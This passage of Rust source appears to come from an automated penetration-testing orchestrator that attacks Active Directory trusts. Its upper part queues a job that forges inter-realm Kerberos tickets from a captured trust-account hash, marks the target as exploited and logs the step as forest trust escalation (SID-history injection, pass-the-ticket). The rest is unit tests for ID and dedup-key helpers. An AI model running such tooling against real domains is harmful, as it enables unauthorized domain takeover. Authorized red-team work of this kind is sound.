            // reject RC4-only inter-realm tickets with KDC_ERR_TGT_REVOKED.
            if let Some(ref aes) = item.hash.aes_key {
                ticket_payload["aes_key"] = json!(aes);
            }

            // Submit under credential_access task_type so the worker's
            // expand_technique_task runs both tools deterministically with
            // the orchestrator-supplied args. No LLM agent involved.
            match dispatcher
                .throttled_submit("credential_access", "credential_access", ticket_payload, 1)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        trust_account = %item.hash.username,
                        source_domain = %item.source_domain,
                        target_domain = %item.target_domain,
                        has_source_sid = item.source_domain_sid.is_some(),
                        has_target_sid = item.target_domain_sid.is_some(),
                        has_aes = item.hash.aes_key.is_some(),
                        "Cross-forest forge-and-present dispatched (deterministic, no LLM)"
                    );
                    let _ = dispatcher
                        .state
                        .mark_exploited(&dispatcher.queue, &vuln_id)
                        .await;

                    // Emit attack path timeline event for forest trust escalation
                    let techniques = vec!["T1134.005".to_string(), "T1550.003".to_string()];
                    let event_id = format!(
                        "evt-trust-{}",
                        &uuid::Uuid::new_v4().simple().to_string()[..8]
                    );
                    let event = serde_json::json!({
                        "id": event_id,
                        "timestamp": chrono::Utc::now().to_rfc3339(),
                        "source": "trust_automation",
                        "description": format!(
                            "Forest trust escalation: {} \u{2192} {} via trust key {}",
                            item.source_domain, item.target_domain, item.hash.username
                        ),
                        "mitre_techniques": techniques,
                    });
                    let _ = dispatcher
                        .state
                        .persist_timeline_event(&dispatcher.queue, &event, &techniques)
                        .await;
                }
                Ok(None) => {
                    debug!("Cross-forest forge deferred by throttler");
                    continue;
                }
                Err(e) => {
                    warn!(err = %e, "Failed to dispatch cross-forest forge");
                    continue;
                }
            }

            // Mark as processed
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                .await;
        }
    }
}

struct TrustFollowWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    source_domain: String,
    target_domain: String,
    target_dc_ip: Option<String>,
    source_domain_sid: Option<String>,
    target_domain_sid: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn child_to_parent_vuln_id_basic() {
        assert_eq!(
            child_to_parent_vuln_id("child.contoso.local", "contoso.local"),
            "child_to_parent_child_contoso_local_contoso_local"
        );
    }

    #[test]
    fn child_to_parent_vuln_id_case_insensitive() {
        assert_eq!(
            child_to_parent_vuln_id("CHILD.Contoso.Local", "Contoso.Local"),
            "child_to_parent_child_contoso_local_contoso_local"
        );
    }

    #[test]
    fn child_to_parent_vuln_id_replaces_dots() {
        let id = child_to_parent_vuln_id("a.b.c", "d.e");
        assert!(!id.contains('.'));
        assert_eq!(id, "child_to_parent_a_b_c_d_e");
    }

    #[test]
    fn child_to_parent_vuln_id_empty_strings() {
        assert_eq!(child_to_parent_vuln_id("", ""), "child_to_parent__");
    }

    #[test]
    fn forest_trust_vuln_id_basic() {
        assert_eq!(
            forest_trust_vuln_id("contoso.local", "fabrikam.local"),
            "forest_trust_contoso.local_fabrikam.local"
        );
    }

    #[test]
    fn forest_trust_vuln_id_case_insensitive() {
        assert_eq!(
            forest_trust_vuln_id("CONTOSO.LOCAL", "FABRIKAM.LOCAL"),
            "forest_trust_contoso.local_fabrikam.local"
        );
    }

    #[test]
    fn forest_trust_vuln_id_empty_strings() {
        assert_eq!(forest_trust_vuln_id("", ""), "forest_trust__");
    }

    #[test]
    fn trust_account_name_basic() {
        assert_eq!(trust_account_name("FABRIKAM"), "FABRIKAM$");
    }

    #[test]
    fn trust_account_name_lowered_input() {
        assert_eq!(trust_account_name("fabrikam"), "FABRIKAM$");
    }

    #[test]
    fn trust_account_name_mixed_case() {
        assert_eq!(trust_account_name("Contoso"), "CONTOSO$");
    }

    #[test]
    fn trust_account_name_empty() {
        assert_eq!(trust_account_name(""), "$");
    }

    #[test]
    fn is_domain_related_exact_match() {
        assert!(is_domain_related("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_case_insensitive() {
        assert!(is_domain_related("CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_domain_related_child_of_target() {
        assert!(is_domain_related("child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_parent_of_target() {
        assert!(is_domain_related("contoso.local", "child.contoso.local"));
    }

    #[test]
    fn is_domain_related_unrelated_domains() {
        assert!(!is_domain_related("fabrikam.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_partial_suffix_no_match() {
        // "oso.local" ends with "contoso.local" substring but is not a valid child
        assert!(!is_domain_related("oso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_empty_strings() {
        assert!(is_domain_related("", ""));
    }

    #[test]
    fn is_domain_related_one_empty() {
        assert!(!is_domain_related("contoso.local", ""));
    }

    #[test]
    fn trust_enum_dedup_key_password() {
        assert_eq!(
            trust_enum_dedup_key("Contoso.Local", false),
            "trust_enum:contoso.local"
        );
    }

    #[test]
    fn trust_enum_dedup_key_hash_retry() {
        assert_eq!(
            trust_enum_dedup_key("Contoso.Local", true),
            "trust_enum_hash:contoso.local"
        );
    }

    #[test]
    fn trust_enum_dedup_key_case_insensitive() {
        assert_eq!(
            trust_enum_dedup_key("CONTOSO.LOCAL", false),
            trust_enum_dedup_key("contoso.local", false)
        );
    }

    #[test]
    fn trust_enum_dedup_key_empty_domain() {
        assert_eq!(trust_enum_dedup_key("", false), "trust_enum:");
        assert_eq!(trust_enum_dedup_key("", true), "trust_enum_hash:");
    }
}
